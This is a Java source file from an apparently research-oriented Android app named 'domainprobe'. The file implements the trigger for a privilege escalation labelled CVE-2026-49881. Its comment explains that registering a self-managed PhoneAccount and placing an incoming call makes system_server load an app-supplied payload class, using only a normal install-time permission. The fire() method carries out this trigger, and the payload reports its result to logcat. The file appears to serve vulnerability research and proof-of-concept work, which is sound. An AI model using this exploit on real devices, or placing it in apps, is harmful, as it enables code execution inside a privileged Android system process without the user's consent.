package dev.pixelksu.domainprobe;

import android.content.ComponentName;
import android.content.Context;
import android.net.Uri;
import android.os.Bundle;
import android.telecom.PhoneAccount;
import android.telecom.PhoneAccountHandle;
import android.telecom.TelecomManager;
import android.util.Log;

/**
 * The system_server trigger, in one place. CVE-2026-49881: registering a
 * self-managed PhoneAccount and placing a self-managed incoming call drives
 * Telecom to bind InCallServices, at which point InCallController runs
 * serviceClassExists() against every InCallService that carries the
 * CLASS_EXISTENCE_CHECK meta-data -- and that call loads {@link TelecomPayload}
 * into system_server. MANAGE_OWN_CALLS is a normal permission, granted at
 * install, so no privileged step is involved.
 *
 * The result does not come back here: system_server cannot write this app's
 * files, so the payload reports to logcat under the "domainprobe" tag. Both
 * MainActivity and {@link ProbeReceiver} call this; it is defined once so the
 * two cannot drift.
 */
final class Telecom {
    private Telecom() {}

    static void fire(Context ctx) {
        try {
            TelecomManager tm = ctx.getSystemService(TelecomManager.class);
            PhoneAccountHandle h = new PhoneAccountHandle(
                    new ComponentName(ctx, BaitConnectionService.class), "domainprobe");
            try { tm.unregisterPhoneAccount(h); } catch (Throwable ignored) {}
            tm.registerPhoneAccount(PhoneAccount.builder(h, "domainprobe")
                    .setCapabilities(PhoneAccount.CAPABILITY_SELF_MANAGED)
                    .addSupportedUriScheme(PhoneAccount.SCHEME_SIP)
                    .build());
            Bundle extras = new Bundle();
            extras.putParcelable(TelecomManager.EXTRA_INCOMING_CALL_ADDRESS,
                    Uri.fromParts(PhoneAccount.SCHEME_SIP, "probe@localhost", null));
            tm.addNewIncomingCall(h, extras);
            Log.i(Report.TAG, "system_server: telecom trigger fired (result in logcat)");
        } catch (Throwable t) {
            Log.e(Report.TAG, "system_server: telecom trigger failed", t);
        }
    }
}
